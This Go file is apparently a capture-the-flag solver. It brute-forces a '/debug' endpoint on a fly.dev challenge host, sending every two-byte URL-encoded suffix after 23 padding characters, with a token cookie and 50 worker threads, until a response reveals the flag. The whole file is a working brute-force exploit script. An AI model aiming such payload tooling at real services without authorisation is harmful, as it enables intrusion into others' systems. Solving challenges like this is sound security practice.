package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	//URL - the vulnerable website's url
	URL = "http://spring-feather-9233.fly.dev/debug"
)

// Job - a job struct for the workers
type Job struct {
	Client       *http.Client
	FirstLetter  uint8
	SecondLetter uint8
}

// sendPayload - sends the GET request with the payload and prints the response
func sendPayload(url string, client *http.Client) {
	res, err := client.Get(url)
	if err != nil {
		//fmt.Printf("[!] couldn't reach the site\n")
		return
	}
	if res.StatusCode != 200 {
		if res.StatusCode == 502 { //invalid token
			fmt.Printf("\r\x1b[31;1m[!] invalid token.\033[0m\n")
		} else {
			fmt.Printf("\r\x1b[31;1m[!] something went wrong..\033[0m\n")
		}
		os.Exit(1)
		return
	}

	body, _ := io.ReadAll(res.Body)
	fmt.Printf("\r\x1b[35;1m[+] trying:\033[0m \x1b[33m%s\033[0m", url)
	if !strings.Contains(string(body[:]), "This isn't") && len(body) != 0 {
		fmt.Printf("\n\x1b[35;1m[+] found the flag:\033[0m \x1b[32;1m%s\033[0m\n", body)
		os.Exit(0)
	}
}

func worker(jobs chan Job, wg *sync.WaitGroup) {
	for job := range jobs {
		client := job.Client
		//create the payload
		payload := fmt.Sprintf("%s%%%x%%%x", strings.Repeat("a", 23), job.FirstLetter, job.SecondLetter)
		url := fmt.Sprintf("%s?input=%s&dbg=0", URL, payload)
		//exploit!
		sendPayload(url, client)
	}
	wg.Done()
}

func main() {

	//parse arguments
	token := flag.String("token", "", "valid token for the debug page")
	workers := flag.Int("workers", 50, "number of threads")
	flag.Parse()
	if len(*token) == 0 {
		fmt.Printf("usage:\n")
		flag.PrintDefaults()
		os.Exit(1)
	}
	//create the client
	baseURL, _ := url.Parse(URL)

	cookie := &http.Cookie{
		Name:  "TEST",
		Value: *token,
	}
	jar, _ := cookiejar.New(nil)
	jar.SetCookies(baseURL, []*http.Cookie{cookie})

	client := &http.Client{
		Transport: nil,
		Jar:       jar,
		Timeout:   time.Second * 5,
	}

	//create the threadpool
	jc := make(chan Job, *workers) //jobs channel
	var wg sync.WaitGroup
	for i := 0; i < cap(jc); i++ {
		go worker(jc, &wg)
		wg.Add(1)
	}

	for i := 0; i < 256; i++ { //pass the jobs to the workers
		for j := 0; j < 256; j++ {
			job := Job{
				Client:       client,
				FirstLetter:  uint8(i),
				SecondLetter: uint8(j),
			}
			jc <- job
		}
	}
	close(jc)
	wg.Wait()

}
